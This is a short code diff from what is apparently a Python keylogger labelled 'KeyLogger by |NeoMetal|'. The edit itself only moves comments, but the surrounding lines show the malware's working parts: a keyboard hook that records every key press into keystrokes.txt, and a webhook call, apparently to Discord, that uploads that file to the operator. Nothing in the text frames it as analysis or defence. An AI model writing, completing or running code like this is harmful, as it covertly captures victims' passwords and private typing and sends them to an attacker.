@@ -30,12 +30,13 @@ for i in range(1):
             file.write("KeyLogger by |NeoMetal|")
 
 log_file = 'keystrokes.txt'
+#file creation and cheack end
 
 #ds_send part
 with open("./keystrokes.txt", 'rb') as message:
     webhook.add_file(file = message.read(), filename="keystrokes.txt")
 response = webhook.execute()
-#file creation and cheack end
+#ds_send part end
 
 #keylog part
 def on_key_press(event):
@@ -46,4 +47,3 @@ keyboard.on_press(on_key_press)
 
 keyboard.wait()
 #keylog part end
-
